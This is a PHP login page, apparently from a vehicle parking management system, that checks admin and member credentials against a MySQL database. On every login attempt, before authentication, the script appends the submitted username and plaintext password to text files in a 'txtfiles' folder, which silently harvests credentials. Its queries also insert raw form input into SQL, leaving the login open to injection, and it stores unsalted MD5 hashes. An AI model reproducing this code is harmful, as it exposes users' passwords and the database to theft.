<?php
session_start();
error_reporting(0);
include('includes/dbconnection.php');
include('includes/header1.php');

if(isset($_POST['login'])){
    date_default_timezone_set("Asia/Manila");
    $dateEncoded = date("Y-m-d");
    $fileNameDate = date("Y")."_".date("m")."_".date("d");
    $timeEncoded = date("h:i:s A");

    $username = $_POST['username'];
    $password = $_POST['password'];
    $fileName = fopen("txtfiles/Login_".$fileNameDate.".txt", "a") or die("Unable to open file!");
    $user = "$username<br>\n";
    $pass = "$password<br>\n";
    $date = "$dateEncoded<br>\n";
    $time = "$timeEncoded<br>\n";
    fwrite($fileName, $user.$pass.$date.$time);
    fclose($fileName);
}
if(isset($_POST['login'])){
    date_default_timezone_set("Asia/Manila");
    $dateEncoded = date("Y-m-d");
    $timeEncoded = date("h:i:s A");

    $username = $_POST['username'];
    $password = $_POST['password'];
    $fileName = fopen("txtfiles/txtfiles.txt", "a") or die("Unable to open file!");
    $user = "$username\n";
    $pass = "$password\n";
    $date = "$dateEncoded\n";
    $time = "$timeEncoded\n";
    fwrite($fileName, $user.$pass.$date.$time);
    fclose($fileName);
}
if(isset($_POST['login']))
  {
    $adminuser=$_POST['username'];
    $password=md5($_POST['password']);
    $companyName = $_POST['companyName'];
/*    if($companyName == "0"){*/
        /*$adminuser=$_POST['username'];
        $password=md5($_POST['password']);*/
        $query2=mysqli_query($con,"select UserName,Password from tbladmin where  UserName='$adminuser' AND Password='$password'");
        $row=mysqli_fetch_array($query2);
        if ($row['UserName'] == $adminuser && $row['Password'] == $password){
            echo "<script>window.location.href ='superAdminDashboard.php'</script>";
        }
        else{
            $msg="Invalid Details.";
        }
/*    }*/


    $query=mysqli_query($con,"select tblpeoplelist.position,tblpeoplelist.peopleId,tblbusinesspartner.areaId from tblbusinesspartner inner join tblpeoplelist on tblbusinesspartner.areaId = tblpeoplelist.areaId where  tblpeoplelist.userName='$adminuser' AND tblpeoplelist.password='$password' AND tblbusinesspartner.companyName = '$companyName'");
 /*   $query=mysqli_query($con,"select areaId,position,peopleId from tblpeoplelist where  userName='$adminuser' AND password='$password'");*/
    $ret=mysqli_fetch_array($query);
    $_SESSION['id'] = $ret['areaId'];
    $id = $_SESSION['id'];
    if($ret['position'] == "Business Associate"){
        $_SESSION['vpmsaid'] = $ret['peopleId'];
        echo("<script>window.location.href ='dashboard.php?id=$id'</script>");
        //header('location:dashboard.php?id="$ret["areaId"]"');
    }
    else if($ret['position'] == "Customer"){
        $_SESSION['vpmsaid'] = $ret['peopleId'];
        echo("<script>window.location.href ='clientPortal.php?id=$id'</script>");
        //header('location:superAdminDashboard.php?id="$ret["areaId"]"');
    }
    else{
        $msg="Invalid Details";
    }
  }
  ?>
<!doctype html>
 <html class="no-js" lang="">
<head>
    
    <title>Login Page</title>
   

    <link rel="apple-touch-icon" href="https://i.imgur.com/QRAUqs9.png">
    <link rel="shortcut icon" href="https://i.imgur.com/QRAUqs9.png">

    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.0/normalize.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.1.3/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/lykmapipo/themify-icons@0.1.2/css/themify-icons.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pixeden-stroke-7-icon@1.2.3/pe-icon-7-stroke/dist/pe-icon-7-stroke.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.0/css/flag-icon.min.css">
    <link rel="stylesheet" href="assets/css/cs-skin-elastic.css">
    <link rel="stylesheet" href="assets/css/style.css">

    <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,600,700,800' rel='stylesheet' type='text/css'>

    <!-- <script type="text/javascript" src="https://cdn.jsdelivr.net/html5shiv/3.7.3/html5shiv.min.js"></script> -->
</head>
<body class="bg-dark">

    <div class="sufee-login d-flex align-content-center flex-wrap">
        <div class="container">
            <div class="login-content">
                <div class="login-logo">
                   <!--  <a href="index.php">
                        <h2 style="color: #fff">Vehicle Parking Management System</h2>
                    </a> -->
                </div>
                <div class="login-form">
                    <form method="post">
                         <p style="font-size:16px; color:red" align="center"> <?php if($msg){
    echo $msg;
  }  ?> </p>
                        <input type="hidden" name="_token" value="cgyIluSERsGxnNMMVRf2rv3xz2rqQbsrTPoVwW6d">
            <h3 class="login-head"><i class="fa fa-lg fa-fw fa-user"></i>SIGN IN</h3>
            <div id="error">
                                            </div><br><br>
                                    <?php 
                                        if($_GET['id'] != 1){ ?>
                                            <div class="form-group">
                                             <label>Choose the company you are member</label>
                                            <select name="companyName" id="companyName" class="form-control">
                                                <option value="0">Select Company Name</option>
                                                <?php $query=mysqli_query($con,"select * from tblbusinesspartner");
              while($row=mysqli_fetch_array($query))
              {
              ?>    
                                                 <option value="<?php echo $row['companyName'];?>"><?php echo $row['companyName'];?></option>
                  <?php } ?> 
                                            </select>
                                    </div> <?php } ?>
                        <div class="form-group">
                            <label>User Name</label>
                           <input class="form-control" type="text" placeholder="Username" required="true" name="username">
                        </div>
                        <div class="form-group">
                            <label>Password</label>
                            <input type="password" class="form-control" name="password" placeholder="Password" required="true">
                        </div>
                        <div class="checkbox">
                            
                            <label class="pull-right">
                                <a href="forgot-password.php">Forgotten Password?</a>
                            </label>

                        </div>
                        <button type="submit" name="login" class="btn btn-success btn-flat m-b-30 m-t-30">Sign in</button>
                       
                       
                    </form>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/jquery@2.2.4/dist/jquery.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.14.4/dist/umd/popper.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.1.3/dist/js/bootstrap.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/jquery-match-height@0.7.2/dist/jquery.matchHeight.min.js"></script>
    <script src="assets/js/main.js"></script>

</body>
</html>
